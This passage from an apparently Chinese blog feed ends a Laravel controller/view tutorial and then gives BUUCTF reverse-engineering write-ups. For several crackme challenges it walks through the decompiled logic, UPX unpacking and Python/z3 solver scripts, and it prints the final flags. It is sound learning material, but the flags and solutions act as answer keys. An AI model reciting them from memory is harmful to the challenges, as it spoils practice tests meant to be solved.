class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HasFactory</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PostTestController-php控制器代码"><a href="#PostTestController-php控制器代码" class="headerlink" title="PostTestController.php控制器代码"></a>PostTestController.php控制器代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">laravel_study_user</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Usertest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostTestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$dbuser</span> = Usertest::query() -&gt; where(<span class="string">&quot;username&quot;</span>,<span class="variable">$user</span>) -&gt; firstOrFail();</span><br><span class="line">        <span class="comment">// dd调试php程序</span></span><br><span class="line">        <span class="comment">//        dd($dbuser);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改了alex用户的email</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;email = &quot;alex.com&quot;;</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;save();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// return视图</span></span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&quot;posttest&quot;</span>,[<span class="string">&quot;user&quot;</span>=&gt;<span class="variable">$user</span>,<span class="string">&quot;email&quot;</span>=&gt;<span class="variable">$dbuser</span>-&gt;email]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web-php路由代码"><a href="#web-php路由代码" class="headerlink" title="web.php路由代码"></a>web.php路由代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the &quot;web&quot; middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;posttest/&#123;user&#125;&#x27;</span>,[\App\Http\Controllers\PostTestController::class,<span class="string">&quot;show&quot;</span>]);</span><br></pre></td></tr></table></figure><h3 id="posttest-blade-php视图代码"><a href="#posttest-blade-php视图代码" class="headerlink" title="posttest.blade.php视图代码"></a>posttest.blade.php视图代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;hello laravel&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt; &#123;&#123; <span class="variable">$user</span> &#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; <span class="variable">$email</span> &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://i.loli.net/2021/04/14/yceTw72BnEvJ3QU.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> 开发学习 </tag>
            
            <tag> 开发框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf reverse题解1</title>
      <link href="2021/04/07/buuctf-reverse/"/>
      <url>2021/04/07/buuctf-reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="1-GXYCTF2019-luck-guy"><a href="#1-GXYCTF2019-luck-guy" class="headerlink" title="1.[GXYCTF2019]luck_guy"></a>1.[GXYCTF2019]luck_guy</h2><p>elf文件，64位，目测是输入什么lucky number<br><img src="https://i.loli.net/2021/04/07/Fjytlk8xvTOhY3f.png" alt=""></p><p>不管他，直接ida f5大法<br>主要的函数就是getflag这个函数<br><img src="https://i.loli.net/2021/04/07/6VtlXNYGDeALmrq.png" alt=""><br>设置了随机数，然后switch，本地测试基本不可能走1-5分支<br>目测一下，比较合理的流程就是451<br>4为f2赋值<br>5改f2的值<br>1拼接f1和f2<br>其中f1在data段，有字符串数据，f2在bss未初始化全局变量段<br>然后就走这个流程，一开始脑子抽了，指针那个地方读错了然后就怎么也找不到<br>结合汇编来读，局部变量s其实不是一个long long类型的数据而是一个字符数组</p><p><img src="https://i.loli.net/2021/04/07/vPWqsT9XVmuxpJl.png" alt=""></p><p>然后本地写个脚本一运行就出来了<br>附上本地调试的py脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;7F666F6067756369&quot;</span></span><br><span class="line"></span><br><span class="line">listFlag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        listFlag.append(flag[i-<span class="number">2</span>:i])</span><br><span class="line"></span><br><span class="line">listFlag.append(<span class="string">&#x27;69&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line">listFlag.reverse()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="string">&#x27;0x&#x27;</span> + listFlag[i]</span><br><span class="line">    <span class="comment"># listFlag[i] = int(listFlag[i],16)</span></span><br><span class="line"><span class="comment"># print(listFlag)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">int</span>(listFlag[i],base = <span class="number">16</span>)</span><br><span class="line">    print(listFlag)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">chr</span>(listFlag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(listFlag))</span><br></pre></td></tr></table></figure><p>最后得到flag，但是是GXY前缀，换上ctf前缀交上才对<br><code>flag&#123;&#123;do_not_hate_me&#125;</code></p><h2 id="2-BJDCTF2020-JustRE"><a href="#2-BJDCTF2020-JustRE" class="headerlink" title="2.[BJDCTF2020]JustRE"></a>2.[BJDCTF2020]JustRE</h2><p>签到题</p><p>感觉像个win32的小程序<br><img src="https://i.loli.net/2021/04/08/uRZEXSd3ThVbU5q.png" alt=""></p><p>搜字符串大法<br><img src="https://i.loli.net/2021/04/08/7FwZ6BTmgpWUM5z.png" alt=""></p><p>发现格式化字符串<br><img src="https://i.loli.net/2021/04/08/Y6zUuAHxFZedtk9.png" alt=""></p><p>交上就对了555</p><h2 id="3-FlareOn4-login"><a href="#3-FlareOn4-login" class="headerlink" title="3.[FlareOn4]login"></a>3.[FlareOn4]login</h2><p>下载下来发现是html文件<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>)     ? c : c - <span class="number">26</span>);&#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span><br><span class="line">        alert(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>发现一段js代码<br>分析发现核心逻辑主要是这一句，只要是字母就被正则匹配到，然后执行下面这个<br><code>String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13)     ? c : c - 26);&#125;);</code><br>大概就是判断字符是否小于Z，如果是第一个括号的值就变成Z否则变成z(注意此时c的值没有发生改变)，然后第二个小括号是将c本身+13(注意此时c的值已经发生了改变)<br>再判断两个值的大小关系，如果前者大就不改变，如果后者大就-26(即相当于+13后-26，本质是原本的字符-13)<br>字母一共26个，如果本身变成z后大于本身+13，那么字母一定会小于n</p><p>有了这个逻辑写解密脚本就可以了，遍历加密后的字符串，如果当前字符属于a-m，那么+13，如果属于n-z，那么-13即可<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line">flaglist = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> flag[i] &lt;= <span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;M&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &lt;= <span class="string">&#x27;m&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) + <span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) - <span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure></p><p><code>flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;</code></p><p>看了别的师傅的wp才发现这是一种加密为ROT13加密，学到了</p><blockquote><p>套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开 头即可。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里头的字元受影响；数字、符 号、空白字元以及所有其他字元都不变。因为只有在英文字母表里头只有26个，并且26=2×13，ROT13函数是它自己的逆反： [1] </p></blockquote><p>对任何字元x：ROT13(ROT13(x))=ROT26(x)=x。<br>直接找个在线解密工具梭出来也可以</p><h2 id="4-GUET-CTF2019-re"><a href="#4-GUET-CTF2019-re" class="headerlink" title="4.[GUET-CTF2019]re"></a>4.[GUET-CTF2019]re</h2><p>是个ELF文件，先checksec一下<br><img src="https://i.loli.net/2021/04/10/oJTznurCURtXE5N.png" alt=""><br>发现存在UPX壳<br>直接用工具脱壳<br><code>./upx -d ./re</code><br>然后进入ida分析，核心逻辑很简单，求出每一位flag然后转换成字符就可以，但是有坑点<br><img src="https://i.loli.net/2021/04/10/6rUJXYEoli1egf5.png" alt=""></p><p>一开始是想逐步求解的，但是发现这也太反人类了，直接用正则提取吧<br>脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line"><span class="number">166163712</span>//<span class="number">1629056</span></span><br><span class="line">,<span class="number">731332800</span>//<span class="number">6771600</span></span><br><span class="line">,<span class="number">357245568</span>//<span class="number">3682944</span></span><br><span class="line">,<span class="number">1074393000</span>//<span class="number">10431000</span></span><br><span class="line">,<span class="number">489211344</span>//<span class="number">3977328</span></span><br><span class="line">,<span class="number">518971936</span>//<span class="number">5138336</span></span><br><span class="line">,<span class="number">406741500</span>//<span class="number">7532250</span></span><br><span class="line">,<span class="number">294236496</span>//<span class="number">5551632</span></span><br><span class="line">,<span class="number">177305856</span>//<span class="number">3409728</span></span><br><span class="line">,<span class="number">650683500</span>//<span class="number">13013670</span></span><br><span class="line">,<span class="number">298351053</span>//<span class="number">6088797</span></span><br><span class="line">,<span class="number">386348487</span>//<span class="number">7884663</span></span><br><span class="line">,<span class="number">438258597</span>//<span class="number">8944053</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  if ( 5198490 * flag[14] != 249527520 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4544518 * flag[15] != 445362764 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 3645600 * flag[17] != 174988800 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 10115280 * flag[16] != 981182160 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9667504 * flag[18] != 493042704 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5364450 * flag[19] != 257493600 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 13464540 * flag[20] != 767478780 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5488432 * flag[21] != 312840624 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 14479500 * flag[22] != 1404511500 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6451830 * flag[23] != 316139670 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6252576 * flag[24] != 619005024 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7763364 * flag[25] != 372641472 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7327320 * flag[26] != 373693320 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8741520 * flag[27] != 498266640 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8871876 * flag[28] != 452465676 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4086720 * flag[29] != 208422720 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9374400 * flag[30] == 515592000 )</span></span><br><span class="line"><span class="string">    return 5759124 * flag[31] == 719890500;</span></span><br><span class="line"><span class="string">  return 0LL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配至少三次数字才有效</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d&#123;3,&#125;&#x27;</span>)</span><br><span class="line">flagRe = pattern.findall(text)</span><br><span class="line">print(flagRe)</span><br><span class="line"></span><br><span class="line">smallList = []</span><br><span class="line">bigList = []</span><br><span class="line">flagAppend = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    smallList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    bigList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(smallList))</span><br><span class="line">print(<span class="built_in">len</span>(bigList))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(smallList)):</span><br><span class="line">    flagAppend.append(bigList[i] // smallList[i])</span><br><span class="line"></span><br><span class="line">print(flagAppend)</span><br><span class="line"></span><br><span class="line">flag = flag + flagAppend</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><p>后来由于这俩坑点就怎么交也不对，搜了师傅们的wp才发现…<br>还有一种解法就是用z3约束器来解（学到了学到了</p><blockquote><p><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p></blockquote><p>用这种方法来解也比较方便，先解出来然后再转ascii码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = Int(<span class="string">&quot;flag[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">1629056</span> * flag[<span class="number">0</span>] == <span class="number">166163712</span>)</span><br><span class="line">s.add(<span class="number">6771600</span> * flag[<span class="number">1</span>] == <span class="number">731332800</span>)</span><br><span class="line">s.add(<span class="number">3682944</span> * flag[<span class="number">2</span>] == <span class="number">357245568</span>)</span><br><span class="line">s.add(<span class="number">10431000</span> * flag[<span class="number">3</span>] == <span class="number">1074393000</span>)</span><br><span class="line">s.add(<span class="number">3977328</span> * flag[<span class="number">4</span>] == <span class="number">489211344</span>)</span><br><span class="line">s.add(<span class="number">5138336</span> * flag[<span class="number">5</span>] == <span class="number">518971936</span>)</span><br><span class="line">s.add(<span class="number">7532250</span> * flag[<span class="number">7</span>] == <span class="number">406741500</span>)</span><br><span class="line">s.add(<span class="number">5551632</span> * flag[<span class="number">8</span>] == <span class="number">294236496</span>)</span><br><span class="line">s.add(<span class="number">3409728</span> * flag[<span class="number">9</span>] == <span class="number">177305856</span>)</span><br><span class="line">s.add(<span class="number">13013670</span> * flag[<span class="number">10</span>] == <span class="number">650683500</span>)</span><br><span class="line">s.add(<span class="number">6088797</span> * flag[<span class="number">11</span>] == <span class="number">298351053</span>)</span><br><span class="line">s.add(<span class="number">7884663</span> * flag[<span class="number">12</span>] == <span class="number">386348487</span>)</span><br><span class="line">s.add(<span class="number">8944053</span> * flag[<span class="number">13</span>] == <span class="number">438258597</span>)</span><br><span class="line">s.add(<span class="number">5198490</span> * flag[<span class="number">14</span>] == <span class="number">249527520</span>)</span><br><span class="line">s.add(<span class="number">4544518</span> * flag[<span class="number">15</span>] == <span class="number">445362764</span>)</span><br><span class="line">s.add(<span class="number">3645600</span> * flag[<span class="number">17</span>] == <span class="number">174988800</span>)</span><br><span class="line">s.add(<span class="number">10115280</span> * flag[<span class="number">16</span>] == <span class="number">981182160</span>)</span><br><span class="line">s.add(<span class="number">9667504</span> * flag[<span class="number">18</span>] == <span class="number">493042704</span>)</span><br><span class="line">s.add(<span class="number">5364450</span> * flag[<span class="number">19</span>] == <span class="number">257493600</span>)</span><br><span class="line">s.add(<span class="number">13464540</span> * flag[<span class="number">20</span>] == <span class="number">767478780</span>)</span><br><span class="line">s.add(<span class="number">5488432</span> * flag[<span class="number">21</span>] == <span class="number">312840624</span>)</span><br><span class="line">s.add(<span class="number">14479500</span> * flag[<span class="number">22</span>] == <span class="number">1404511500</span>)</span><br><span class="line">s.add(<span class="number">6451830</span> * flag[<span class="number">23</span>] == <span class="number">316139670</span>)</span><br><span class="line">s.add(<span class="number">6252576</span> * flag[<span class="number">24</span>] == <span class="number">619005024</span>)</span><br><span class="line">s.add(<span class="number">7763364</span> * flag[<span class="number">25</span>] == <span class="number">372641472</span>)</span><br><span class="line">s.add(<span class="number">7327320</span> * flag[<span class="number">26</span>] == <span class="number">373693320</span>)</span><br><span class="line">s.add(<span class="number">8741520</span> * flag[<span class="number">27</span>] == <span class="number">498266640</span>)</span><br><span class="line">s.add(<span class="number">8871876</span> * flag[<span class="number">28</span>] == <span class="number">452465676</span>)</span><br><span class="line">s.add(<span class="number">4086720</span> * flag[<span class="number">29</span>] == <span class="number">208422720</span>)</span><br><span class="line">s.add(<span class="number">9374400</span> * flag[<span class="number">30</span>] == <span class="number">515592000</span>)</span><br><span class="line">s.add(<span class="number">5759124</span> * flag[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><h2 id="5-WUSTCTF2020-level1"><a href="#5-WUSTCTF2020-level1" class="headerlink" title="5.[WUSTCTF2020]level1"></a>5.[WUSTCTF2020]level1</h2><p>源码和逻辑都很简单，对flag进行加密，然后还给了output文件，应该就是flag加密后的输出结果<br><img src="https://i.loli.net/2021/04/10/lTe58pKU7iIGdRz.png" alt=""></p><p>写个解密脚本就行了（1，3，5，7…与1相与为1）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flagReverse = [</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">198</span>,</span><br><span class="line">    <span class="number">232</span>,</span><br><span class="line">    <span class="number">816</span>,</span><br><span class="line">    <span class="number">200</span>,</span><br><span class="line">    <span class="number">1536</span>,</span><br><span class="line">    <span class="number">300</span>,</span><br><span class="line">    <span class="number">6144</span>,</span><br><span class="line">    <span class="number">984</span>,</span><br><span class="line">    <span class="number">51200</span>,</span><br><span class="line">    <span class="number">570</span>,</span><br><span class="line">    <span class="number">92160</span>,</span><br><span class="line">    <span class="number">1200</span>,</span><br><span class="line">    <span class="number">565248</span>,</span><br><span class="line">    <span class="number">756</span>,</span><br><span class="line">    <span class="number">1474560</span>,</span><br><span class="line">    <span class="number">800</span>,</span><br><span class="line">    <span class="number">6291456</span>,</span><br><span class="line">    <span class="number">1782</span>,</span><br><span class="line">    <span class="number">65536000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagReverse)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] &gt;&gt; i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] // i</span><br><span class="line"></span><br><span class="line">    flagReverse[i] = <span class="built_in">chr</span>(flagReverse[i])</span><br><span class="line"></span><br><span class="line">flag = flagReverse[<span class="number">1</span>:]</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><h2 id="6-Youngter-drive"><a href="#6-Youngter-drive" class="headerlink" title="6.Youngter-drive"></a>6.Youngter-drive</h2><blockquote><p>UPX脱壳:<a href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a></p></blockquote><p>先去个壳<br><img src="https://i.loli.net/2021/04/11/cGXKI38bUisLfzJ.png" alt=""></p><p>main函数中启动了两个子线程<br><img src="https://i.loli.net/2021/04/11/rgxAZITfhmq1ozW.png" alt=""></p><p>第一个线程对于我们输入的flag进行替换<br><img src="https://i.loli.net/2021/04/11/ZTrNDyLRgpScUB9.png" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_411940</span><span class="params">(<span class="keyword">int</span> source, <span class="keyword">int</span> target_in_data_1d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(_BYTE *)(target_in_data_1d + source);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="string">&#x27;a&#x27;</span> || v3 &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 大写字母 - 38，即27-52</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">38</span>];</span><br><span class="line">    <span class="comment">// 将索引映射到另外一张表进行替换</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 小写字母 - 96，即1 - 26</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">96</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个线程只是减去data段的一个计数器，并没有对我们输入的字符串进行操作，所以坑点1就是在我们输入的字符串中，只有偶数位（0，1，3,…29）被进行替换了<br>替换逻辑比较简单，见上面贴的注释</p><p>坑点2就是最后check的时候只检查了29位，最后一位搜的wp是填E（好像在安恒赛的时候填啥都对，然后看了一个师傅的wp觉得应该填Z，因为映射回来正好是NULL<br><img src="https://i.loli.net/2021/04/11/d4vbaU7eFPiVZwx.png" alt=""></p><p>脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">flagRe = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsySa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> v3 = *(_BYTE *)(target_in_data_1d + source);</span></span><br><span class="line"><span class="string">  if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) )</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">  if ( v3 &lt; 